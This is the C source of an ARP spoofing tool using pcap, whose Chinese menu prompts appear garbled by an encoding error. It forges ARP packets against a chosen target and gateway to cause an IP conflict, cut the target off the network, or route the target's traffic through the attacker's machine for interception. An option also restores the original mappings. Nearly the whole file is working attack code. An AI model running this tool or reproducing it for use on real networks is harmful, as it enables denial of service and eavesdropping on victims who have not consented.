#include "init.h"

#define MAX_IP_LEN 16
const unsigned char FAKE_MAC[] = { 0x01, 0x01, 0x01, 0x01, 0x01, 0x01 };

int main() {
	unsigned char my_mac[MAC_LEN], gateway_mac[MAC_LEN], target_mac[MAC_LEN];
	char gateway_ip[MAX_IP_LEN], target_ip[MAX_IP_LEN];
	//select adapter
	pcap_t *adapter;
	selectAdapter(&adapter);
	puts("-----------------------------------------------------------------------------------");
	//input
	printf("Ta��ip\n>");
	scanf("%s", target_ip);
	printf("Ta��MAC����ʽΪxxxxxxxxxxxx��12λ��\n>");
	inputMac(target_mac);
	printf("���ص�ip\n>");
	scanf("%s", gateway_ip);
	printf("���ص�MAC\n>");
	inputMac(gateway_mac);
	printf("���MAC\n>");
	inputMac(my_mac);
	puts("-----------------------------------------------------------------------------------");
	//select
	int type;
	ARP_PKT target_pkt, gateway_pkt;
	while (1) {
		puts("1.ʹĳ��IP��ͻ");
		puts("2.��ֹĳ������");
		puts("3.����ĳ������");
		puts("4.�ָ�ԭ��");
		printf("����һ���󵨵��뷨������...:");
		scanf("%d", &type);
		switch (type) {
		case 1:
			makePkt(&target_pkt, target_ip, (unsigned char *)FAKE_MAC, target_ip, target_mac);
			for (int i = 0; i < 10; i++) {
				pcap_sendpacket(adapter, (unsigned char *)&target_pkt, sizeof(ARP_PKT));
				Sleep(100);
			}
			break;
		case 2:
			makePkt(&target_pkt, gateway_ip, (unsigned char *)FAKE_MAC, target_ip, target_mac);
			makePkt(&gateway_pkt, target_ip, (unsigned char *)FAKE_MAC, gateway_ip, gateway_mac);
			pcap_sendpacket(adapter, (unsigned char *)&target_pkt, sizeof(ARP_PKT));
			pcap_sendpacket(adapter, (unsigned char *)&gateway_pkt, sizeof(ARP_PKT));
			break;
		case 3:
			makePkt(&target_pkt, gateway_ip, my_mac, target_ip, target_mac);
			makePkt(&gateway_pkt, target_ip, my_mac, gateway_ip, gateway_mac);
			pcap_sendpacket(adapter, (unsigned char *)&target_pkt, sizeof(ARP_PKT));
			pcap_sendpacket(adapter, (unsigned char *)&gateway_pkt, sizeof(ARP_PKT));
			break;
		case 4:
			makePkt(&target_pkt, gateway_ip, gateway_mac, target_ip, target_mac);
			makePkt(&gateway_pkt, target_ip, target_mac, gateway_ip, gateway_mac);
			pcap_sendpacket(adapter, (unsigned char *)&target_pkt, sizeof(ARP_PKT));
			pcap_sendpacket(adapter, (unsigned char *)&gateway_pkt, sizeof(ARP_PKT));
			Sleep(200);
			pcap_sendpacket(adapter, (unsigned char *)&target_pkt, sizeof(ARP_PKT));
			pcap_sendpacket(adapter, (unsigned char *)&gateway_pkt, sizeof(ARP_PKT));
			break;
		}
		puts("Done.");
		puts("-----------------------------------------------------------------------------------");
	}
	return 0;
}
